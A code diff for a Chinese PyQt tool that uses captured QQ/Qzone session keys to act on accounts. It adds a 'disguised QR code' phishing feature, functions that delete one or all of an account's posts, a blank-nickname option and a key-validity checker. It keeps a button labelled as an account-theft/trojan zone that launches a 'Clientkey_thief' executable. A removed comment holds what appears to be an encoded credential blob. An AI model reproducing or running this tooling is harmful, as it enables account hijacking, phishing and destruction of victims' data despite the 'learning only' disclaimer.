@@ -13,6 +13,7 @@ import requests
 import re
 from threading import Thread
 import time
+from html import unescape
 import csv
 import ctypes
 from webbrowser import open as webopen
@@ -105,12 +106,14 @@ class Ui_MainWindow(QtWidgets.QWidget):
         self.cookie = ''
         self.g_tk = ''
         self.qzone_url = ''
+        self.cookie_thread_running = False
         font = QFont()
         font.setFamily("微软雅黑")
         MainWindow.setFont(font)
         MainWindow.setObjectName("MainWindow")
-        MainWindow.resize(831,567)
+        MainWindow.resize(947, 567)
         MainWindow.setWindowIcon(QIcon("./icon.ico"))
+        MainWindow.setFixedSize(MainWindow.width(), MainWindow.height())
         QtWidgets.QMessageBox.information(self,"警告","本软件纯免费且开源 如果你是花钱买的火速投诉!\n本软件仅供学习用途 请勿用作违法行为 后果自负!")
         self.centralwidget = QtWidgets.QWidget(MainWindow)
         self.centralwidget.setObjectName("centralwidget")
@@ -138,7 +141,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
         self.label_5.setGeometry(QtCore.QRect(380, 10, 61, 31))
         self.label_5.setObjectName("label_5")
         self.lineEdit_2 = QtWidgets.QLineEdit(self.centralwidget)
-        self.lineEdit_2.setGeometry(QtCore.QRect(450, 100, 271, 21))
+        self.lineEdit_2.setGeometry(QtCore.QRect(520, 90, 281, 21))
         self.lineEdit_2.setInputMask("")
         self.lineEdit_2.setText("")
         self.lineEdit_2.setFrame(True)
@@ -148,10 +151,10 @@ class Ui_MainWindow(QtWidgets.QWidget):
         self.lineEdit_2.setCursorMoveStyle(QtCore.Qt.LogicalMoveStyle)
         self.lineEdit_2.setObjectName("lineEdit_2")
         self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
-        self.lineEdit.setGeometry(QtCore.QRect(450, 70, 271, 20))
+        self.lineEdit.setGeometry(QtCore.QRect(520, 60, 281, 20))
         self.lineEdit.setObjectName("lineEdit")
         self.lineEdit_3 = QtWidgets.QLineEdit(self.centralwidget)
-        self.lineEdit_3.setGeometry(QtCore.QRect(450, 130, 271, 20))
+        self.lineEdit_3.setGeometry(QtCore.QRect(520, 120, 281, 20))
         self.lineEdit_3.setObjectName("lineEdit_3")
         self.checkBox = QtWidgets.QCheckBox(self.centralwidget)
         self.checkBox.setGeometry(QtCore.QRect(390, 180, 51, 16))
@@ -164,7 +167,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     pinned=int(self.checkBox.isChecked()),skey=self.skey,
                     pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                     if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
-                    if self.lineEdit_2 and self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.lineEdit_2.text() and self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                     )
         self.pushButton_3 = QtWidgets.QPushButton(self.centralwidget)
         self.pushButton_3.setGeometry(QtCore.QRect(610, 170, 111, 41))
@@ -177,7 +180,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     q_bkn=bkn(self.skey),skey=self.skey,
                     pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                     if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
-                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                     )
         self.pushButton_5 = QtWidgets.QPushButton(self.centralwidget)
         self.pushButton_5.setGeometry(QtCore.QRect(610, 230, 111, 41))
@@ -186,7 +189,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     bkn=bkn(self.skey),skey=self.skey,
                     pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin)
                     if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
-                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                     )
         self.pushButton_6 = QtWidgets.QPushButton(self.centralwidget)
         self.pushButton_6.setGeometry(QtCore.QRect(440, 290, 111, 41))
@@ -195,7 +198,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     bkn=bkn(self.skey),skey=self.skey,
                     pskey=self.pskey,qid=self.lineEdit.text(),uin=self.uin,fid=self.lineEdit_3.text())
                     if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
-                    if self.lineEdit else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                     )
         self.pushButton_7 = QtWidgets.QPushButton(self.centralwidget)
         self.pushButton_7.setGeometry(QtCore.QRect(610, 290, 111, 41))
@@ -209,7 +212,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
                     )
         self.pushButton_8 = QtWidgets.QPushButton(self.centralwidget)
-        self.pushButton_8.setGeometry(QtCore.QRect(700, 490, 111, 41))
+        self.pushButton_8.setGeometry(QtCore.QRect(820, 490, 111, 41))
         self.pushButton_8.setObjectName("pushButton_8")
         self.pushButton_8.clicked.connect(lambda: webopen("https://github.com/sun589/QQkey_Tool"))
         self.pushButton_9 = QtWidgets.QPushButton(self.centralwidget)
@@ -220,7 +223,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
                     pskey=self.pskey,uin=self.uin,
                     newname=self.lineEdit.text())
                     if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
-                    if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
                     if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
                     )
         self.pushButton_10 = QtWidgets.QPushButton(self.centralwidget)
@@ -232,9 +235,83 @@ class Ui_MainWindow(QtWidgets.QWidget):
         if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误", "请先填入内容!")
         if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误", "此功能仅qzone可用!"))
         self.pushButton_11 = QtWidgets.QPushButton(self.centralwidget)
-        self.pushButton_11.setGeometry(QtCore.QRect(560, 490, 111, 41))
+        self.pushButton_11.setGeometry(QtCore.QRect(680, 490, 111, 41))
         self.pushButton_11.setObjectName("pushButton_11")
         self.pushButton_11.clicked.connect(lambda: os.system('start .\\Clientkey_thief.exe'))
+        self.pushButton_12 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_12.setGeometry(QtCore.QRect(440, 410, 111, 41))
+        self.pushButton_12.setObjectName("pushButton_12")
+        self.pushButton_12.clicked.connect(lambda: self.get_emotion_list(
+                    g_tk=self.g_tk,skey=self.skey,
+                    pskey=self.pskey,uin=self.uin,
+                    num=self.lineEdit_2.text())
+                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
+                    if self.lineEdit_2.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
+                    )
+        self.pushButton_13 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_13.setGeometry(QtCore.QRect(80, 450, 201, 41))
+        self.pushButton_13.setObjectName("pushButton_13")
+        self.pushButton_13.clicked.connect(self.make_fake_qr)
+        self.pushButton_14 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_14.setGeometry(QtCore.QRect(610, 410, 111, 41))
+        self.pushButton_14.setObjectName("pushButton_14")
+        self.pushButton_14.clicked.connect(lambda: self.delete_emotion(
+                    g_tk=self.g_tk,skey=self.skey,
+                    pskey=self.pskey,uin=self.uin,
+                    tid=self.lineEdit_3.text())
+                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
+                    if self.lineEdit_3.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
+                    )
+        self.pushButton_15 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_15.setGeometry(QtCore.QRect(780, 170, 111, 41))
+        self.pushButton_15.setObjectName("pushButton_15")
+        self.pushButton_15.clicked.connect(lambda: self.change_name(
+                    g_tk=self.g_tk,skey=self.skey,
+                    pskey=self.pskey,uin=self.uin,
+                    newname="‎")
+                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
+                    )
+        self.pushButton_16 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_16.setGeometry(QtCore.QRect(780, 230, 111, 41))
+        self.pushButton_16.setObjectName("pushButton_16")
+        self.pushButton_16.clicked.connect(lambda: self.delete_all_emotions(
+                    g_tk=self.g_tk,skey=self.skey,
+                    pskey=self.pskey,uin=self.uin)
+                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
+                    if self.lineEdit.text() else QtWidgets.QMessageBox.critical(self, "错误","请先填入内容!")
+                    if self.g_tk else QtWidgets.QMessageBox.critical(self, "错误","此功能仅qzone可用!")
+                    )
+        self.pushButton_17 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_17.setGeometry(QtCore.QRect(780, 290, 111, 41))
+        self.pushButton_17.setObjectName("pushButton_17")
+        self.pushButton_18 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_18.setGeometry(QtCore.QRect(780, 350, 111, 41))
+        self.pushButton_18.setObjectName("pushButton_18")
+        self.pushButton_19 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_19.setGeometry(QtCore.QRect(780, 410, 111, 41))
+        self.pushButton_19.setObjectName("pushButton_19")
+        self.pushButton_21 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_21.setGeometry(QtCore.QRect(400, 490, 111, 41))
+        self.pushButton_21.setObjectName("pushButton_21")
+        self.pushButton_21.clicked.connect(lambda: self.check_key(
+                    bkn=bkn(self.skey),skey=self.skey,
+                    pskey=self.pskey,uin=self.uin,g_tk=self.g_tk)
+                    if self.skey else QtWidgets.QMessageBox.critical(self, "错误", "请先获取skey!")
+                    )
+        self.label_6 = QtWidgets.QLabel(self.centralwidget)
+        self.label_6.setGeometry(QtCore.QRect(580, 170, 16, 281))
+        self.label_6.setObjectName("label_6")
+        self.label_7 = QtWidgets.QLabel(self.centralwidget)
+        self.label_7.setGeometry(QtCore.QRect(750, 170, 16, 281))
+        self.label_7.setObjectName("label_7")
+        self.pushButton_20 = QtWidgets.QPushButton(self.centralwidget)
+        self.pushButton_20.setGeometry(QtCore.QRect(540, 490, 111, 41))
+        self.pushButton_20.setObjectName("pushButton_20")
+        self.pushButton_20.clicked.connect(lambda:webopen("https://github.com/sun589/QQkey_Tool/issues"))
         self.comboBox = QtWidgets.QComboBox(self.centralwidget)
         self.comboBox.setGeometry(QtCore.QRect(80, 265, 200, 22))
         self.comboBox.setEditable(False)
@@ -277,13 +354,13 @@ class Ui_MainWindow(QtWidgets.QWidget):
         self.label_5.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt; color:#ff0000;\">功能区:</span></p></body></html>"))
         self.pushButton_2.setText(_translate("MainWindow", "发布公告(qun)"))
         self.pushButton_3.setText(_translate("MainWindow", "群列表(qun)"))
-        self.lineEdit_2.setPlaceholderText(_translate("MainWindow", "QQ号/说说内容/群公告内容"))
+        self.lineEdit_2.setPlaceholderText(_translate("MainWindow", "QQ号/说说内容/群公告内容/说说获取个数"))
         self.lineEdit.setPlaceholderText(_translate("MainWindow", "群号/名字"))
         self.checkBox.setText(_translate("MainWindow", "置顶"))
         self.pushButton_4.setText(_translate("MainWindow", "群公告列表(qun)"))
         self.pushButton_5.setText(_translate("MainWindow", "群成员(qun)"))
         self.pushButton_6.setText(_translate("MainWindow", "删除群公告(qun)"))
-        self.lineEdit_3.setPlaceholderText(_translate("MainWindow", "群公告fid"))
+        self.lineEdit_3.setPlaceholderText(_translate("MainWindow", "群公告fid/说说tid"))
         self.pushButton_7.setText(_translate("MainWindow", "发布说说(qzone)"))
         self.pushButton_8.setText(_translate("MainWindow", "打开Github主页"))
         self.comboBox.setCurrentText(_translate("MainWindow", "qzone.qq.com"))
@@ -291,7 +368,19 @@ class Ui_MainWindow(QtWidgets.QWidget):
         self.comboBox.setItemText(1, _translate("MainWindow", "qzone.qq.com"))
         self.pushButton_9.setText(_translate("MainWindow", "修改昵称(qzone)"))
         self.pushButton_10.setText(_translate("MainWindow", "好友列表(qzone)"))
+        self.pushButton_12.setText(_translate("MainWindow", "说说列表(qzone)"))
         self.pushButton_11.setText(_translate("MainWindow", "盗号/木马专区"))
+        self.pushButton_13.setText(_translate("MainWindow", "伪装二维码"))
+        self.pushButton_14.setText(_translate("MainWindow", "删除说说(qzone)"))
+        self.pushButton_15.setText(_translate("MainWindow", "空白昵称(qzone)"))
+        self.pushButton_16.setText(_translate("MainWindow", "删除全部说说(qzone)"))
+        self.pushButton_17.setText(_translate("MainWindow", "正在开发..."))
+        self.pushButton_18.setText(_translate("MainWindow", "正在开发..."))
+        self.pushButton_19.setText(_translate("MainWindow", "正在开发..."))
+        self.label_6.setText(_translate("MainWindow", "<html><head/><body><p>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|</p></body></html>"))
+        self.label_7.setText(_translate("MainWindow", "<html><head/><body><p>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|<br/>|</p></body></html>"))
+        self.pushButton_20.setText(_translate("MainWindow", "提供反馈"))
+        self.pushButton_21.setText(_translate("MainWindow", "Key 有效性检测"))
         self.menu.setTitle(_translate("MainWindow", "菜单"))
         self.action_Key.setText(_translate("MainWindow", "设置Key"))
         self.action.setText(_translate("MainWindow", "使用帮助"))
@@ -325,12 +414,30 @@ class Ui_MainWindow(QtWidgets.QWidget):
             self.uin = data['uin']
             self.cookie = data['cookie']
             _translate = QtCore.QCoreApplication.translate
+            self.cookie_thread_running = False
             self.label_2.setText(_translate("MainWindow",
                                             f"<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:配置加载成功!</span></p><p><span style=\" font-size:11pt;\">QQ号码:{self.uin}</span></p><p><span style=\" font-size:11pt;\">Skey:{self.skey}</span></p></body></html>"))
             QtWidgets.QMessageBox.information(self,"提示","加载成功!")
         except Exception as e:
             print(repr(e))
             QtWidgets.QMessageBox.critical(self,"错误","不是有效的配置码!")
+
+    def make_fake_qr(self):
+        if os.path.isfile("fake_qr.jpg") and os.path.isfile("qr.jpg"):
+            qr_image = Image.open('qr.jpg')
+            target_image = Image.open('fake_qr.jpg')
+            x1, y1 = 267, 1034
+            x2, y2 = 439, 1200
+            width, height = x2 - x1, y2 - y1
+            resized_qr_image = qr_image.resize((width, height), Image.LANCZOS)
+            target_image.paste(resized_qr_image, (x1, y1))
+            target_image.save('new_qr.png')
+            qr_image.close()
+            target_image.close()
+            QtWidgets.QMessageBox.information(self, "提示", "保存成功!\n文件名:new_qr.png")
+            os.startfile("new_qr.png")
+        else:
+            QtWidgets.QMessageBox.critical(self, "错误", "二维码文件/伪装码模板图片不存在!")
     def help(self,h):
         if h == 1:
             QtWidgets.QMessageBox.information(self, "使用帮助", """发布公告:
@@ -358,7 +465,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
 作用:将群内成员移除(需有管理/群主权限)
     """)
         else:
-            QtWidgets.QMessageBox.about(self, "使用帮助", "作者:Daniel\n本软件仅供于学习用途 禁止用于违法行为 后果自负")
+            QtWidgets.QMessageBox.about(self, "使用帮助", "作者:sun589\n本软件仅供于学习用途 禁止用于违法行为 后果自负")
 
     def get_qq(self):
         self.qr()
@@ -366,8 +473,9 @@ class Ui_MainWindow(QtWidgets.QWidget):
         flag = True
         time.sleep(1)
         flag = False
-        thread1 = Thread(target=self.cookies,args=(self.ptqrtoken,self.qrsig))
-        thread1.start()
+        self.cookie_thread_running = True
+        self.thread1 = Thread(target=self.cookies,args=(self.ptqrtoken,self.qrsig))
+        self.thread1.start()
     def qr(self):
         print("获取二维码中...")
         if self.comboBox.currentIndex() == 0:
@@ -390,7 +498,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
         _translate = QtCore.QCoreApplication.translate
         while True:
             global flag
-            if flag == True:
+            if flag == True or self.cookie_thread_running == False:
                 break
             if self.comboBox.currentIndex() == 0:
                 l = requests.get(
@@ -437,6 +545,53 @@ class Ui_MainWindow(QtWidgets.QWidget):
                 break
             time.sleep(1)
 
+    def check_key(self,uin,skey,pskey,g_tk,bkn):
+        _translate = QtCore.QCoreApplication.translate
+        if g_tk:
+            Cookies = {
+                "p_skey": pskey,
+                "uin": str(uin),
+                "skey": skey,
+                "p_uin": str(uin)
+            }
+            headers = {
+                "Referer": f"https://user.qzone.qq.com/",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+                "Origin": "https://user.qzone.qq.com"
+            }
+            try:
+                res = requests.get(f"https://h5.qzone.qq.com/proxy/domain/base.qzone.qq.com/cgi-bin/user/cgi_userinfo_get_all?uin={uin[1:]}&vuin={uin[1:]}&fupdate=1&rd=0.017501202984373077&g_tk={g_tk}",headers=headers,cookies=Cookies).text
+                res = res[10:-2]
+                res = json.loads(res)['data']['uin']
+                QtWidgets.QMessageBox.information(self,"提示","Key值依然有效,可继续使用!")
+            except:
+                QtWidgets.QMessageBox.critical(self,"错误","Key值已失效,请重新获取!")
+                self.label_2.setText(_translate("MainWindow",
+                                                "<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
+                self.uin = ''
+                self.skey = ''
+                self.pskey = ''
+                self.cookie = ''
+                self.g_tk = ''
+                self.qzone_url = ''
+                self.cookie_thread_running = False
+        else:
+            try:
+                url = 'https://qun.qq.com/cgi-bin/qun_mgr/get_group_list'
+                data = {'bkn': bkn}
+                qun_lis = requests.post(url, data=data, cookies=self.cookie).json()['join'][0]
+                QtWidgets.QMessageBox.information(self,"提示", "Key值依然有效,可继续使用!")
+            except:
+                QtWidgets.QMessageBox.critical(self,"错误","Key值已失效,请重新获取!")
+                self.label_2.setText(_translate("MainWindow",
+                                                "<html><head/><body><p><span style=\" font-size:11pt; color:#000000;\">当前状态:</span></p><p><span style=\" font-size:11pt;\">QQ号码:</span></p><p><span style=\" font-size:11pt;\">Skey:</span></p></body></html>"))
+                self.uin = ''
+                self.skey = ''
+                self.pskey = ''
+                self.cookie = ''
+                self.g_tk = ''
+                self.qzone_url = ''
+                self.cookie_thread_running = False
     def new_notice(self,text, q_bkn, pinned, qid, skey, pskey, uin):
         data = {
             "qid": qid,
@@ -472,17 +627,11 @@ class Ui_MainWindow(QtWidgets.QWidget):
                 l = []
                 try:
                     for i in qun_lis['create']:
-                        csv_f.writerow([str(i['gn'])+'\t', str(i['gc']), str(i['owner'])+'\t',"群主"])
-                except Exception as e:
-                    print(e)
-                try:
+                        csv_f.writerow([str(i['gn']), str(i['gc'])+'\t', str(i['owner'])+'\t',"群主"])
                     for i in qun_lis['manage']:
-                        csv_f.writerow([str(i['gc'])+'\t', str(i['gn']), str(i['owner'])+'\t',"管理员"])
-                except Exception as e:
-                    print(e)
-                try:
+                        csv_f.writerow([str(i['gn']), str(i['gc'])+'\t', str(i['owner'])+'\t',"管理员"])
                     for i in qun_lis['join']:
-                        csv_f.writerow([str(i['gc'])+'\t', str(i['gn']), str(i['owner'])+'\t',"成员"])
+                        csv_f.writerow([str(i['gn']), str(i['gc'])+'\t', str(i['owner'])+'\t',"成员"])
                 except Exception as e:
                     print(e)
                 print(l)
@@ -500,7 +649,7 @@ class Ui_MainWindow(QtWidgets.QWidget):
             "bkn": q_bkn,
             "n":"10",
             "s":"-1",
-            "ni":"undefined",
+            "ni":"1",
             "i":"1",
             "ft":"23"
         }
@@ -516,23 +665,29 @@ class Ui_MainWindow(QtWidgets.QWidget):
             "skey": skey,
             "p_uin": str(uin)
         }
-        i = 9
         notices = []
-        while True:
+        res = requests.get("https://web.qun.qq.com/mannounce/index.html?_wv=1031&_bid=148",headers=headers,cookies=Cookies)
+        Cookies['tgw_l7_route'] = requests.utils.dict_from_cookiejar(res.cookies).get("tgw_l7_route")
+        s_flag = True
+        while s_flag:
             res = requests.post(f"https://web.qun.qq.com/cgi-bin/announce/list_announce?bkn={q_bkn}", params=data,json=data,headers=headers, cookies=Cookies).json()
             if "feeds" in res or "inst" in res:
-                print(1)
-                i -= 10
-                print(2)
-                data['s'] = i
+                data['s'] = str(int(data['s'])-10)
+                data['ni'] = 'undefined'
                 try:
-                    for j in res['feeds']:
-                        notices.append([str(j['u'])+'\t',str(j['fid']),str(j['msg']['text'])+'\t'])
+                    for j in res['inst']:
+                        if [str(j['u'])+'\t',str(j['fid']),unescape(j['msg']['text']).replace("\n","[换行]")+'\t'] in notices:
+                            s_flag = True
+                            break
+                        notices.append([str(j['u'])+'\t',str(j['fid']),unescape(j['msg']['text']).replace("\n","[换行]")+'\t'])
                 except Exception as e:
                     print(e)
                 try:
-                    for j in res['inst']:
-                        notices.append([str(j['u'])+'\t',str(j['fid']),str(j['msg']['text'])+'\t'])
+                    for j in res['feeds']:
+                        if [str(j['u'])+'\t',str(j['fid']),unescape(j['msg']['text']).replace("\n","[换行]")+'\t'] in notices:
+                            s_flag = True
+                            break
+                        notices.append([str(j['u'])+'\t',unescape(j['fid']),str(j['msg']['text']).replace("\n","[换行]")+'\t'])
                 except Exception as e:
                     print(e)
             else:
@@ -714,9 +869,11 @@ class Ui_MainWindow(QtWidgets.QWidget):
     "clean":"1",
     "g_tk":g_tk
 }
-        res = requests.get("https://user.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_ship_manager.cgi",params=data,cookies=Cookies,headers=headers,json=data,data=data).text[10:-2]
-        friend_list = json.loads(res).get("data").get("items_list")
-        #eyJ1aW4iOiAibzI3Mzc5MTcyODgiLCAic2tleSI6ICJAaWFBYTRINzFsIiwgInBza2V5IjogIkNkdnM4b2xIcGRraXRBcGRGa2x5RC1tSnpOYUpjWWVZYWlteXBLN1hnZHdfIiwgImNvb2tpZSI6IHsic2tleSI6ICJAaWFBYTRINzFsIiwgInVpbiI6ICJvMjczNzkxNzI4OCIsICJwX3NrZXkiOiAiQ2R2czhvbEhwZGtpdEFwZEZrbHlELW1Kek5hSmNZZVlhaW15cEs3WGdkd18iLCAicF91aW4iOiAibzI3Mzc5MTcyODgiLCAicHQ0X3Rva2VuIjogIkg3NHZCTEh0MERMKm5qaDMxdUJLTG5GZDBxeDdzVzRxTUw1VWVCbmotQWdfIn0sICJnX3RrIjogMTgyNTUxMzQxNSwgInF6b25lX3VybCI6ICJodHRwczovL3B0bG9naW4yLnF6b25lLnFxLmNvbS9jaGVja19zaWc/cHR0eXBlPTEmdWluPTI3Mzc5MTcyODgmc2VydmljZT1wdHFybG9naW4mbm9kaXJlY3Q9MCZwdHNpZ3g9MTczZjJhNDI3MmE5ZmU2NWUyMmY1ZmFkYzE1NTIzZDk1OWJhNjc4NGM4YTQ5NmQ1NzJiOTJlNDY1YzhiYWI2NDI3YjY1ZDgxY2IzZDA2NWRiOWU1ZGYyZDNkMDFkNjExZDM1ZmY5ZDE5NmM5YmNkNjY1YTQ1Y2VjODM5ZmE5NThlM2MyNjM5YTdjYWYyMjg0JnNfdXJsPWh0dHBzJTNBJTJGJTJGcXpzLnFxLmNvbSUyRnF6b25lJTJGdjUlMkZsb2dpbnN1Y2MuaHRtbCUzRnBhcmElM0Rpem9uZSZmX3VybD0mcHRsYW5nPTIwNTImcHRyZWRpcmVjdD0xMDAmYWlkPTU0OTAwMDkxMiZkYWlkPTUmal9sYXRlcj0wJmxvd19sb2dpbl9ob3VyPTAmcmVnbWFzdGVyPTAmcHRfbG9naW5fdHlwZT0zJnB0X2FpZD0wJnB0X2FhaWQ9MTYmcHRfbGlnaHQ9MCZwdF8zcmRfYWlkPTAifQ==
+        try:
+            res = requests.get("https://user.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_ship_manager.cgi",params=data,cookies=Cookies,headers=headers,json=data,data=data).text[10:-2]
+            friend_list = json.loads(res).get("data").get("items_list")
+        except:
+            QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开friend_list.csv的文件!")
         try:
             with open("friend_list.csv",'w',encoding='utf-8-sig',newline='') as f:
                 csv_f = csv.writer(f)
@@ -728,6 +885,124 @@ class Ui_MainWindow(QtWidgets.QWidget):
             QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开friend_list.csv的文件!")
         except Exception as e:
             QtWidgets.QMessageBox.about(self, "错误", "未知错误!")
+
+    def get_emotion_list(self,g_tk,uin,skey,pskey,num,return_content=False,pos=0,get_num=10):
+        Cookies = {
+            "p_skey": pskey,
+            "uin": str(uin),
+            "skey": skey,
+            "p_uin": str(uin)
+        }
+        headers = {
+            "Referer": f"https://user.qzone.qq.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+            "Origin": "https://user.qzone.qq.com"
+        }
+        data = {
+    "uin":uin[1:],
+    "inCharset":"utf-8",
+    "outCharset":"utf-8",
+    "hostUin":"2737917288",
+    "notice":"0",
+    "sort":"0",
+    "pos":str(pos),
+    "num":str(get_num),
+    "cgi_host":"https://user.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6",
+    "code_version":"1",
+    "format":"json",
+    "need_private_comment":"1",
+    "g_tk":str(g_tk)
+}
+        count = 0
+        emotions_list = []
+        try:
+            num = int(num)
+        except:
+            QtWidgets.QMessageBox.critical(self, "错误", "数量有误!")
+            return
+        while count < num:
+            res = requests.get(
+                f"https://user.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6",
+                params=data, headers=headers, cookies=Cookies).json()
+            if res.get("msglist"):
+                msg_list = res['msglist']
+                for msg in msg_list:
+                    img_url = "无"
+                    video_url = "无"
+                    content = "无"
+                    if 'pic' in msg and msg.get("pic"):
+                        img_url = msg['pic'][0]['url1']
+                    if 'video' in msg and msg.get("video"):
+                        video_url = msg['video'][0]['url3']
+                    if 'content' in msg and msg.get("content"):
+                        content = msg['content'].replace("\n","[换行]")
+                    if [f"\"{msg['createTime']}\"",msg['tid'],content,img_url,video_url] in emotions_list:
+                        continue
+                    emotions_list.append([f"\"{msg['createTime']}\"",msg['tid'],content,img_url,video_url])
+                    count += 1
+                data['pos'] = str(int(data['pos'])+1)
+            else:
+                break
+        if return_content == False:
+            try:
+                with open("emotions_list.csv", 'w', encoding='utf-8-sig', newline='') as f:
+                    csv_f = csv.writer(f, quoting=csv.QUOTE_ALL)
+                    csv_f.writerow(['创建时间', '说说tid','内容','图片链接','视频链接'])
+                    csv_f.writerows(emotions_list)
+                QtWidgets.QMessageBox.about(self, "提示", "已保存至emotions_list.csv!")
+            except PermissionError:
+                QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开emotions_list.csv的文件!")
+            except Exception as e:
+                QtWidgets.QMessageBox.about(self, "错误", "未知错误!")
+        else:
+            return emotions_list
+
+    def delete_emotion(self,g_tk,uin,tid,skey,pskey,no_log=False):
+        data = {
+    "hostuin":uin[1:],
+    "tid":tid,
+    "t1_source":"1",
+    "code_version":"1",
+    "format":"fs",
+    "qzreferrer":f"https://user.qzone.qq.com/{uin[1:]}"
+}
+        Cookies = {
+            "p_skey": pskey,
+            "uin": str(uin),
+            "skey": skey,
+            "p_uin": str(uin)
+        }
+        headers = {
+            "Referer": f"https://user.qzone.qq.com/",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+            "Origin": "https://user.qzone.qq.com"
+        }
+        requests.post(f"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_delete_v6?&g_tk={g_tk}",json=data,data=data,cookies=Cookies,headers=headers)
+        if no_log == False:
+            QtWidgets.QMessageBox.about(self, "提示", "删除成功!")
+
